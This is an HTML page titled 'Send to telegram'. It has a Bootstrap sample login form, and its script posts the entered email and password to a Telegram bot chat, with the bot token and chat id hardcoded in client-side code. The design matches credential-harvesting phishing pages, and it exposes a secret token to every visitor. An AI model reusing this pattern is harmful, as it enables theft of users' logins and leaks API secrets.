<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="./style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
</head>
<body>
    <div class="box">
        <h1>Send to telegram</h1>
        <form id="form">
            <div class="form-group">
              <label for="exampleInputEmail1">Email address</label>
              <input type="name" name="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email">
              <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small>
            </div>
            <div class="form-group">
              <label for="exampleInputPassword1">Password</label>
              <input type="text" name="name" class="form-control" id="exampleInputPassword1" placeholder="Password">
            </div>
            <div class="form-check">
              <input type="checkbox" class="form-check-input" id="exampleCheck1">
              <label class="form-check-label" for="exampleCheck1">Check me out</label>
            </div>
            <button type="submit" class="btn btn-primary">Submit</button>
          </form>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script>
        const TOKEN = "6007574391:AAHb8OtKqA19Z2jXfM5r7T8oLzKMthp7TW8"
        const CHAT_ID = "-1001898709374"
        const form = document.querySelector("#form")
        const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`


        form.addEventListener("submit", function(data) {
            data.preventDefault();

            let message = `<b>Message</b>\n`
            message += `<b>User: ${ this.name.value }</b>\n`
            message += `<b>Email: ${ this.email.value }</b>\n`

            axios.post(URL_API, {
                chat_id: CHAT_ID,
                parse_mode: "html",
                text: message
            })
        })
    </script>
</body>
</html>
